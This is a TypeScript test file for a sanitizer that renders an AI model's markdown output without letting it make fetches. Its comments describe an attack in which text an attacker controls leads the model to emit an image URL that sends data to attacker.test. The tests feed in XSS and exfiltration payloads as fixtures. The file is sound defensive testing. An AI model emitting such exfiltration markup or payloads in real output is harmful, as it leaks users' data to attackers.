// Spec §0.13. **THE RENDERER IS THE LAST PLACE THIS MODULE CAN LEAK, AND THE
// ONLY ONE WHERE THE ADMIN'S OWN BROWSER IS THE ATTACKER'S CLIENT.**
//
// A read-only agent with no outbound tool cannot exfiltrate — unless the
// renderer provides the egress. Retrieved text reaches model context (that is
// the whole point of a tool result) and model output reaches this renderer, so
// an answer containing `![](https://attacker/?d=<data>)` would make the
// administrator's browser issue a GET carrying whatever the model was willing
// to put in a query string. There is no app-tier CSP to fall back on:
// `app/api/security_headers.py` sets only `X-Content-Type-Options` and a
// `no-store` on the checkout path, and TLS/HSTS and any CSP live at the edge.
//
// EVERY ASSERTION HERE IS ON THE RENDERED DOM, not on the HTML string. A string
// test can be satisfied by escaping; the question this file asks is whether the
// browser ends up with an element that fetches something.

import { beforeEach, describe, expect, it } from "vitest";
import { renderMarkdown } from "../../docs/markdown";
import { renderAiMarkdown } from "../aiMarkdown";

let host: HTMLElement;

beforeEach(() => {
  host = document.createElement("div");
  document.body.appendChild(host);
});

function render(markdown: string): HTMLElement {
  host.innerHTML = renderAiMarkdown(markdown);
  return host;
}

describe("renderAiMarkdown", () => {
  it("renders a markdown image as no element at all", () => {
    // THE EXFILTRATION TEST. It is the reason this file exists.
    const dom = render("Here is the summary.\n\n![x](https://attacker.test/?d=abc)");

    expect(dom.querySelectorAll("img")).toHaveLength(0);
    expect(document.querySelectorAll("img")).toHaveLength(0);
    // The prose around it survives: dropping the answer would be a denial of
    // service, which §8.4 forbids just as firmly as it forbids the fetch.
    expect(dom.textContent).toContain("Here is the summary.");
    // And the URL does not survive as an attribute anywhere in the subtree.
    for (const element of dom.querySelectorAll("*")) {
      for (const attribute of element.attributes) {
        expect(attribute.value).not.toContain("attacker.test");
      }
    }
  });

  it("renders raw HTML image markup as no element and no event handler", () => {
    const dom = render('Summary. <img src="x" onerror="alert(1)"> More.');

    expect(dom.querySelectorAll("img")).toHaveLength(0);
    expect(dom.innerHTML).not.toContain("onerror");
    expect(dom.textContent).toContain("Summary.");
  });

  it("renders a link as text with its target visible and no href to follow", () => {
    // §0.13: click-through text with the target shown, never auto-fetched and
    // never prefetched. The target is INFORMATION for the reader, not a
    // navigable attribute — a preloader follows `href`, and `<link
    // rel=prefetch>` and `<a ping>` follow attributes too, so the rebuilt node
    // carries none.
    const dom = render("See [the runbook](https://intranet.test/runbook) for detail.");

    expect(dom.querySelectorAll("a")).toHaveLength(0);
    expect(dom.textContent).toContain("the runbook");
    expect(dom.textContent).toContain("https://intranet.test/runbook");
    for (const element of dom.querySelectorAll("*")) {
      expect(element.getAttribute("href")).toBeNull();
      expect(element.getAttribute("ping")).toBeNull();
      expect(element.getAttribute("rel")).toBeNull();
    }
  });

  it("keeps a javascript: target as inert text rather than a link", () => {
    const dom = render("[click](javascript:alert(1))");

    expect(dom.querySelectorAll("a")).toHaveLength(0);
    expect(dom.querySelector("[href]")).toBeNull();
  });

  it("drops every attribute, so style and srcset cannot ride in on an allowed tag", () => {
    // The allowlist is over TAGS; the attribute policy is "none, ever". A
    // denylist of dangerous attributes has to be right every time, and
    // `style="background-image:url(...)"` on a `<p>` is the same fetch as an
    // `<img>` with a friendlier name.
    const dom = render(
      '<p style="background-image:url(https://attacker.test/p.png)" ' +
        'srcset="https://attacker.test/s.png">text</p>',
    );

    const paragraph = dom.querySelector("p");
    expect(paragraph).not.toBeNull();
    expect(paragraph?.attributes.length).toBe(0);
    expect(dom.innerHTML).not.toContain("attacker.test");
  });

  it("drops iframe, object, svg and link elements entirely, children included", () => {
    const dom = render(
      "<iframe src='https://attacker.test/'></iframe>" +
        "<object data='https://attacker.test/'></object>" +
        "<svg><image href='https://attacker.test/s.svg'/></svg>" +
        "<link rel='prefetch' href='https://attacker.test/p'>",
    );

    for (const tag of ["iframe", "object", "svg", "image", "link"]) {
      expect(dom.querySelectorAll(tag)).toHaveLength(0);
    }
    expect(dom.innerHTML).not.toContain("attacker.test");
  });

  it("renders ordinary markdown so an answer is still readable", () => {
    const dom = render(
      "## Today\n\nTwo tickets are **open**.\n\n" +
        "| id | subject |\n|---|---|\n| TCK-1 | printer |\n\n- one\n- two\n\n`code`",
    );

    expect(dom.querySelector("h2")?.textContent).toBe("Today");
    expect(dom.querySelector("strong")?.textContent).toBe("open");
    expect(dom.querySelectorAll("li")).toHaveLength(2);
    expect(dom.querySelector("table")).not.toBeNull();
    expect(dom.querySelector("code")?.textContent).toBe("code");
  });

  it("is a different policy from the docs renderer, which keeps links live", () => {
    // **A SHARED ALLOWLIST IS A SHARED BLAST RADIUS**, and this is the assertion
    // that keeps the two apart.
    //
    // `frontend/src/modules/docs/markdown.ts` is a good sanitizer and it
    // currently drops `<img>` — but it is the DOCS module's allowlist, tuned for
    // documentation articles a colleague wrote, and it preserves `<a href>` as a
    // live link. A future docs change adding `img` to its `ALLOWED_TAGS` —
    // entirely reasonable there — would silently widen the renderer that
    // displays model output derived from unauthenticated attacker-controlled
    // text, with no test in this module going red.
    //
    // Asserted BEHAVIOURALLY rather than by grepping this module's imports,
    // because the behaviour is what matters and it survives a rename: the two
    // policies DISAGREE on exactly the case §0.13 is about, so a re-export of
    // the docs sanitizer under this module's name fails here, and so would an
    // `aiMarkdown` that delegated to it.
    const markdown = "[runbook](https://intranet.test/runbook)";
    const docs = renderMarkdown(markdown);
    const ai = renderAiMarkdown(markdown);

    expect(docs).toContain('href="https://intranet.test/runbook"');
    expect(ai).not.toContain("href=");
    expect(ai).toContain("https://intranet.test/runbook");
  });
});
